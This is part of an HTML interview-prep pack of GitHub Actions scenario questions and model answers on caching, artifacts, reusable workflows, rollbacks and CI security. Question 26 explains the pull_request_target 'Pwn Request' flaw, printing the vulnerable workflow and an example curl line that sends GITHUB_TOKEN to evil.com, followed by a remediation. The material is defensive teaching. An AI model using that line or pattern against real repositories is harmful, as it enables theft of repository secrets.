+<article class="qcard" data-category="Caching &amp; Pipeline Optimization" data-search="docker buildx cache gha type github actions registry build">
+<div class="qhead"><div class="num">17</div><div class="qmeta"><div class="category">Caching &amp; Pipeline Optimization</div><div class="question">A Docker container build takes 12 minutes in GitHub Actions because every run downloads the base image and rebuilds all layers. How do you configure Docker Buildx with GitHub Actions native caching?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Leverage Docker Buildx with the native GitHub Actions cache backend (<code>type=gha</code>).</p><ul><li>Configure the build step using <code>docker/build-push-action@v5</code>:
+<pre>- name: Set up Docker Buildx
+  uses: docker/setup-buildx-action@v3
+
+- name: Build and push Docker image
+  uses: docker/build-push-action@v5
+  with:
+    context: .
+    push: true
+    tags: ghcr.io/my-org/my-app:${{ github.sha }}
+    cache-from: type=gha
+    cache-to: type=gha,mode=max</pre>
+</li><li><strong><code>cache-from: type=gha:</code></strong> Pulls intermediate build layers directly from GitHub's internal cache service over local high-speed network.</li><li><strong><code>mode=max:</code></strong> Caches all intermediate stages from multi-stage builds, not just the final output layer. Build time drops from 12 minutes to under 45 seconds on incremental code changes.</li></ul></div></article>
+
+<article class="qcard" data-category="Caching &amp; Pipeline Optimization" data-search="cache limit 10gb eviction policy branch isolation">
+<div class="qhead"><div class="num">18</div><div class="qmeta"><div class="category">Caching &amp; Pipeline Optimization</div><div class="question">Your repository hits the 10GB GitHub Actions cache limit. How does GitHub's cache eviction policy work, and how do branch cache boundaries affect hits?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Understanding cache limits and branch boundaries is vital for high-volume monorepos:</p><ul><li><strong>Eviction Policy:</strong> GitHub maintains a hard limit of 10GB per repository. Once 10GB is exceeded, GitHub evicts older caches based on <strong>Least Recently Used (LRU)</strong> order. Caches unaccessed for &gt;7 days are automatically purged.</li><li><strong>Branch Isolation Boundaries:</strong>
+  <ul>
+    <li>A feature branch PR can access caches created on the default branch (<code>main</code>), but <code>main</code> can NEVER access caches created on a feature branch.</li>
+    <li>Two separate feature branches cannot access each other's caches.</li>
+  </ul>
+</li><li><strong>Best Practice:</strong> Prime the master cache on <code>main</code> after every release so all downstream feature branches benefit from a shared high-quality cache baseline. Delete obsolete caches using the GitHub CLI: <code>gh cache delete &lt;cache-id&gt;</code>.</li></ul></div></article>
+
+<article class="qcard" data-category="Caching &amp; Pipeline Optimization" data-search="upload-artifact download-artifact retention days pass data between jobs">
+<div class="qhead"><div class="num">19</div><div class="qmeta"><div class="category">Caching &amp; Pipeline Optimization</div><div class="question">Job B needs a 500MB compiled binary produced by Job A on a separate runner. How do you pass this artifact efficiently while preventing storage bloat?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use <code>actions/upload-artifact@v4</code> and <code>actions/download-artifact@v4</code> with a strictly minimized <code>retention-days</code> setting.</p><ul><li><strong>Job A (Producer):</strong>
+<pre>- name: Upload compiled binary
+  uses: actions/upload-artifact@v4
+  with:
+    name: compiled-app
+    path: dist/
+    retention-days: 1 # Discard after 24 hours to prevent storage costs</pre></li><li><strong>Job B (Consumer):</strong>
+<pre>test-e2e:
+  needs: build-job
+  runs-on: ubuntu-latest
+  steps:
+    - name: Download compiled binary
+      uses: actions/download-artifact@v4
+      with:
+        name: compiled-app
+        path: dist/</pre></li><li><code>v4</code> of upload/download-artifact offers significantly faster parallel transfer speeds and native compression compared to legacy <code>v3</code>. Setting <code>retention-days: 1</code> ensures temporary pipeline artifacts don't incur billable storage costs over the standard 90-day retention default.</li></ul></div></article>
+
+<article class="qcard" data-category="Caching &amp; Pipeline Optimization" data-search="dag needs dependencies parallel stages execution flow">
+<div class="qhead"><div class="num">20</div><div class="qmeta"><div class="category">Caching &amp; Pipeline Optimization</div><div class="question">Design a workflow with a Directed Acyclic Graph (DAG) where `lint` and `unit-tests` run in parallel, followed by `e2e-tests` only if both pass, and `notify-slack` runs always.</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Define explicit job dependencies with <code>needs</code> and control terminal execution with status conditions.</p><ul><li>Workflow YAML structure:
+<pre>jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps: [...]
+
+  unit-test:
+    runs-on: ubuntu-latest
+    steps: [...]
+
+  e2e-test:
+    needs: [lint, unit-test]
+    runs-on: ubuntu-latest
+    steps: [...]
+
+  notify-slack:
+    needs: [e2e-test]
+    if: always() # Runs regardless of whether upstream jobs passed or failed
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send Slack Alert
+        run: echo "Pipeline finished with status: ${{ needs.e2e-test.result }}"</pre></li><li>Jobs without a <code>needs</code> block execute simultaneously in parallel. <code>e2e-test</code> waits for both <code>lint</code> and <code>unit-test</code> to complete with success. <code>if: always()</code> ensures alerting fires even on upstream build crashes.</li></ul></div></article>
+
+<!-- Domain 5: Reusable Workflows & Architecture -->
+<section class="section-title"><h2>Reusable Workflows &amp; Architecture</h2><span>workflow_call · Composite actions · Centralized CI templates · Dynamic matrix</span></section>
+
+<article class="qcard" data-category="Reusable Workflows &amp; Architecture" data-search="reusable workflow workflow_call composite action differences">
+<div class="qhead"><div class="num">21</div><div class="qmeta"><div class="category">Reusable Workflows &amp; Architecture</div><div class="question">Compare Reusable Workflows (`workflow_call`) vs Composite Actions. When would an enterprise architect mandate one over the other?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Both promote DRY (Don't Repeat Yourself) automation across repositories, but operate at different scopes:</p><ul><li><strong>Reusable Workflows (<code>on: workflow_call</code>):</strong>
+  <ul>
+    <li>Defines entire multi-job workflows, including runner environments, matrix configurations, secrets, and environment protection gates.</li>
+    <li><em>When to use:</em> Mandating standardized enterprise deployment pipelines (e.g. all 50 microservices must execute standard build &rarr; SAST &rarr; Sonar &rarr; EKS deploy). Callers cannot tamper with inner stage logic.</li>
+  </ul>
+</li><li><strong>Composite Actions (<code>using: 'composite'</code>):</strong>
+  <ul>
+    <li>Defines a collection of shell steps or action steps packaged as a single step inside an existing job.</li>
+    <li><em>When to use:</em> Bundling repetitive multi-step shell procedures (e.g., install AWS CLI + configure auth + export environment variables) into a clean 1-line reusable step.</li>
+  </ul>
+</li></ul></div></article>
+
+<article class="qcard" data-category="Reusable Workflows &amp; Architecture" data-search="pass secrets reusable workflow secrets inherit security">
+<div class="qhead"><div class="num">22</div><div class="qmeta"><div class="category">Reusable Workflows &amp; Architecture</div><div class="question">How do you pass secrets securely to a Reusable Workflow in another repository, and what is the risk of using `secrets: inherit`?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>There are two methods to deliver secrets into reusable workflows:</p><ul><li><strong>Explicit Secret Mapping (Safest):</strong>
+<pre>uses: my-org/shared-workflows/.github/workflows/deploy.yml@v2
+secrets:
+  KUBE_CONFIG: ${{ secrets.PROD_KUBE_CONFIG }}</pre></li><li><strong>Secret Inheritance:</strong>
+<pre>uses: my-org/shared-workflows/.github/workflows/deploy.yml@v2
+secrets: inherit</pre></li><li><strong>Security Risk of <code>secrets: inherit</code>:</strong> All secrets accessible in the caller repository are exposed to the called workflow. If the reusable workflow is hosted in an external or loosely managed repository, a compromised update in that workflow can silently read and exfiltrate all inherited secrets. Restrict <code>secrets: inherit</code> only to internal, strictly governed organizational repositories.</li></ul></div></article>
+
+<article class="qcard" data-category="Reusable Workflows &amp; Architecture" data-search="dynamic matrix fromJson generate matrix dynamically bash">
+<div class="qhead"><div class="num">23</div><div class="qmeta"><div class="category">Reusable Workflows &amp; Architecture</div><div class="question">You have a monorepo with 40 microservices. You only want to test and build services that had files modified in the latest PR. How do you generate a dynamic matrix?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use an initial discovery job that outputs a JSON array, paired with <code>fromJson()</code> in the matrix strategy.</p><ul><li><strong>Step 1 (Discovery Job):</strong>
+<pre>detect-changes:
+  runs-on: ubuntu-latest
+  outputs:
+    matrix: ${{ steps.set-matrix.outputs.services }}
+  steps:
+    - uses: actions/checkout@v4
+      with: { fetch-depth: 0 }
+    - id: set-matrix
+      run: |
+        # Find directories with modified files
+        CHANGED=$(git diff --name-only origin/main HEAD | cut -d/ -f2 | sort -u | jq -R -s -c 'split("\n")[:-1]')
+        echo "services=$CHANGED" >> "$GITHUB_OUTPUT"</pre></li><li><strong>Step 2 (Consumer Job):</strong>
+<pre>build-services:
+  needs: detect-changes
+  strategy:
+    matrix:
+      service: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+  runs-on: ubuntu-latest
+  steps:
+    - run: echo "Building service ${{ matrix.service }}"</pre></li></ul></div></article>
+
+<article class="qcard" data-category="Reusable Workflows &amp; Architecture" data-search="custom composite action action yml inputs outputs shell">
+<div class="qhead"><div class="num">24</div><div class="qmeta"><div class="category">Reusable Workflows &amp; Architecture</div><div class="question">Write a minimal, production-grade Composite Action (`action.yml`) that accepts an AWS S3 bucket name input and uploads a folder with retries.</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Create <code>action.yml</code> inside a repository subfolder (e.g. <code>.github/actions/s3-uploader/action.yml</code>):</p><ul><li><pre>name: 'S3 Sync Action'
+description: 'Uploads directory to S3 with retries'
+inputs:
+  bucket-name:
+    description: 'Target S3 bucket'
+    required: true
+  source-dir:
+    description: 'Local directory to upload'
+    required: true
+    default: 'dist'
+runs:
+  using: 'composite'
+  steps:
+    - name: Run S3 Sync
+      shell: bash
+      run: |
+        echo "Uploading ${{ inputs.source-dir }} to s3://${{ inputs.bucket-name }}"
+        aws s3 sync ${{ inputs.source-dir }} s3://${{ inputs.bucket-name }} --delete --only-show-errors</pre></li><li>Caller usage:
+<pre>- uses: ./.github/actions/s3-uploader
+  with:
+    bucket-name: 'my-production-assets'
+    source-dir: 'build/assets'</pre></li></ul></div></article>
+
+<article class="qcard" data-category="Reusable Workflows &amp; Architecture" data-search="workflow_dispatch inputs manual trigger rollback deployment">
+<div class="qhead"><div class="num">25</div><div class="qmeta"><div class="category">Reusable Workflows &amp; Architecture</div><div class="question">How do you design a robust manual Rollback workflow with `workflow_dispatch` that prompts the engineer for Target Environment, Image Tag, and Reason?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use <code>workflow_dispatch</code> with typed input schemas and validation.</p><ul><li><pre>on:
+  workflow_dispatch:
+    inputs:
+      environment:
+        type: choice
+        description: 'Target deployment environment'
+        required: true
+        options:
+          - staging
+          - production
+      image_tag:
+        type: string
+        description: 'Docker image tag to rollback to (e.g. v2.3.1)'
+        required: true
+      reason:
+        type: string
+        description: 'Jira ticket / Outage Incident #'
+        required: true
+      dry_run:
+        type: boolean
+        description: 'Validate without applying changes'
+        default: false</pre></li><li>Access values safely inside steps:
+<pre>- name: Execute Rollback
+  run: |
+    echo "Initiating rollback by ${{ github.actor }} on ${{ inputs.environment }}"
+    echo "Incident Reason: ${{ inputs.reason }}"
+    helm rollback my-release --values env-${{ inputs.environment }}.yaml</pre></li></ul></div></article>
+
+<!-- Domain 6: Troubleshooting & Attack Prevention -->
+<section class="section-title"><h2>Troubleshooting &amp; Attack Prevention</h2><span>Pull_request_target vulnerabilities · Debugging · API rate limits · Audit logs</span></section>
+
+<article class="qcard" data-category="Troubleshooting &amp; Attack Prevention" data-search="pull_request_target pwn request vulnerability checkout pr fork">
+<div class="qhead"><div class="num">26</div><div class="qmeta"><div class="category">Troubleshooting &amp; Attack Prevention</div><div class="question">What is a `pull_request_target` vulnerability ('Pwn Request') and how does an attacker steal your repository write tokens?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p><code>pull_request_target</code> runs in the context of the base branch (with full repository write access and secrets), rather than the unprivileged fork context.</p><ul><li><strong>Vulnerable pattern:</strong>
+<pre>on: pull_request_target
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }} # DANGEROUS!
+      - run: npm install &amp;&amp; npm test</pre></li><li><strong>Exploit:</strong> The attacker forks the repo, modifies <code>package.json</code> or a test file to execute <code>curl -d "$GITHUB_TOKEN" https://evil.com</code>, and submits a PR. Because <code>pull_request_target</code> has read/write tokens and access to secrets, the attacker's untrusted script exfiltrates production secrets.</li><li><strong>Remediation:</strong> Never checkout untrusted fork code in a workflow triggered by <code>pull_request_target</code>. Use standard <code>pull_request</code> for running tests, and reserve <code>pull_request_target</code> exclusively for labeling or commenting on PRs without checking out code.</li></ul></div></article>
+
+<article class="qcard" data-category="Troubleshooting &amp; Attack Prevention" data-search="github token rate limit 5000 requests secondary rate limits">
+<div class="qhead"><div class="num">27</div><div class="qmeta"><div class="category">Troubleshooting &amp; Attack Prevention</div><div class="question">During peak CI periods, jobs fail with `HTTP 403: API rate limit exceeded for GITHUB_TOKEN`. How does GitHub Actions rate limiting work and how do you resolve it?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>GitHub imposes strict primary and secondary rate limits on API requests:</p><ul><li><strong>Rate limits:</strong>
+  <ul>
+    <li>Default <code>GITHUB_TOKEN</code>: 1,000 requests per hour per repository for GitHub Free, or 15,000 requests per hour for GitHub Enterprise Cloud.</li>
+    <li>Personal Access Tokens (PAT) / GitHub App: 5,000 requests per hour per user/app.</li>
+  </ul>
+</li><li><strong>Common culprits:</strong> Custom scripts polling GitHub API in tight loops, release tools calling <code>git fetch --tags</code> hundreds of times, or parallel matrix jobs making simultaneous GraphQL calls.</li><li><strong>Resolution:</strong>
+  <ul>
+    <li>Switch from user PATs to a dedicated <strong>GitHub App</strong>, which scales rate limits with organization user count (up to 12,500+ requests/hr).</li>
+    <li>Implement exponential backoff in automation scripts when HTTP 403 / 429 is received.</li>
+    <li>Leverage Actions Cache rather than repeatedly downloading releases from GitHub API.</li>
+  </ul>
+</li></ul></div></article>
+
+<article class="qcard" data-category="Troubleshooting &amp; Attack Prevention" data-search="debug runner interactive ssh tmate actions step fail">
+<div class="qhead"><div class="num">28</div><div class="qmeta"><div class="category">Troubleshooting &amp; Attack Prevention</div><div class="question">A flaky integration test fails only on the GitHub-hosted Linux runner, but passes perfectly on every engineer's local machine. How do you troubleshoot the live runner interactively?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use interactive SSH debugging on the runner or enable runner diagnostic logging.</p><ul><li><strong>Option 1 (Enable Step Debug Logging):</strong> Re-run the job with <em>"Enable debug logging"</em> checked in GitHub UI, or set repository secret <code>ACTIONS_STEP_DEBUG: true</code> and <code>ACTIONS_RUNNER_DEBUG: true</code> to see verbose runner commands and environment states.</li><li><strong>Option 2 (Interactive SSH via tmate):</strong>
+<pre>- name: Setup tmate session
+  if: failure() # Trigger only if previous step failed
+  uses: mxschmitt/action-tmate@v3</pre>
+GitHub Actions pauses the build and prints an SSH/Web connection URL in the logs. You can SSH directly into the live runner environment, inspect filesystem permissions, network ports, and environment variables, and test commands in real time.</li><li><em>Caution:</em> Never leave tmate enabled on production branches or repositories with active credentials.</li></ul></div></article>
+
+<article class="qcard" data-category="Troubleshooting &amp; Attack Prevention" data-search="timeout minutes cancel stuck hung job billing kill">
+<div class="qhead"><div class="num">29</div><div class="qmeta"><div class="category">Troubleshooting &amp; Attack Prevention</div><div class="question">A test command hung waiting for user input, running for 6 hours (GitHub's default limit) and burning hundreds of organization billable minutes. How do you guard against this?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Always mandate explicit <code>timeout-minutes</code> on both the job level and individual step level.</p><ul><li><strong>Job-level timeout:</strong>
+<pre>test-suite:
+  runs-on: ubuntu-latest
+  timeout-minutes: 15 # Overrides default 360-minute limit</pre></li><li><strong>Step-level timeout:</strong>
+<pre>- name: Run E2E Tests
+  timeout-minutes: 8
+  run: npm run test:e2e</pre></li><li><strong>Non-interactive flags:</strong> Always pass non-interactive flags to CLI tools in CI: <code>DEBIAN_FRONTEND=noninteractive</code>, <code>npm ci</code> (instead of <code>npm install</code>), and <code>terraform apply -auto-approve</code>.</li></ul></div></article>
+
+<article class="qcard" data-category="Troubleshooting &amp; Attack Prevention" data-search="audit log actions security monitoring compliance enterprise">
+<div class="qhead"><div class="num">30</div><div class="qmeta"><div class="category">Troubleshooting &amp; Attack Prevention</div><div class="question">An attacker deleted an active workflow file from `main` to bypass security checks. How does an enterprise SRE detect, alert, and audit this using GitHub Audit Logs?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Enterprise auditability requires centralizing GitHub Audit Logs and enforcing branch protection rulesets.</p><ul><li><strong>Audit Log Investigation:</strong> Search GitHub Organization Audit Log for <code>action:workflow.delete</code> or <code>action:repo.create</code>. Audit log entries record the actor IP address, GitHub username, timestamp, and target workflow SHA.</li><li><strong>SIEM Integration:</strong> Stream GitHub Enterprise Audit Logs to Splunk, Datadog, or AWS S3/CloudWatch using GitHub Audit Log Streaming API.</li><li><strong>Prevention via Rulesets:</strong> Configure <strong>GitHub Rulesets</strong> on <code>main</code> with:
+  <ul>
+    <li><em>"Restrict deletions"</em> enabled.</li>
+    <li><em>"Block force pushes"</em> enabled.</li>
+    <li><em>"Require pull request before merging"</em> with mandatory CODEOWNERS review on <code>.github/workflows/**</code> paths.</li>
+  </ul>
+</li></ul></div></article>
+
+</div>
+
+<div class="probe" style="margin-top:28px"><b>Interviewer Scoring Guide:</b> A strong 5-year DevOps engineer should demonstrate deep mastery of modern CI/CD security (eliminating static credentials via OIDC, locking down GITHUB_TOKEN, pinning commit SHAs), show architect-level understanding of runner infrastructure (ARC on Kubernetes, ephemeral vs persistent runners), and optimize pipelines for speed and cost with Buildx and caching.</div>
+
+<div class="footer">GitHub Actions Senior DevOps Scenario Pack &bull; 30 Scenario Questions &bull; NimbusWiz Tech &bull; Prepared for Class &amp; Technical Interview Practice</div>
+
+</main>
+
+<script>
+document.querySelectorAll('.qhead').forEach(h=>h.addEventListener('click',()=>h.parentElement.classList.toggle('open')));
+function expandAll(open){document.querySelectorAll('.qcard').forEach(c=>c.classList.toggle('open',open))}
+const search=document.getElementById('search'),filter=document.getElementById('filter');
+function apply(){
+  const q=search.value.toLowerCase(),f=filter.value;
+  document.querySelectorAll('.qcard').forEach(c=>{
+    const ok=(f==='all'||c.dataset.category===f)&&(c.dataset.search.toLowerCase().includes(q)||c.innerText.toLowerCase().includes(q));
+    c.style.display=ok?'':'none';
+  });
+  document.querySelectorAll('.section-title').forEach(s=>{
+    let n=s.nextElementSibling,visible=false;
+    while(n && !n.classList.contains('section-title')){
+      if(n.classList.contains('qcard') && n.style.display!=='none') visible=true;
+      n=n.nextElementSibling;
+    }
+    s.style.display=visible?'':'none';
+  });
+}
+search.addEventListener('input',apply);filter.addEventListener('change',apply);
+</script>
+</body>
+</html>
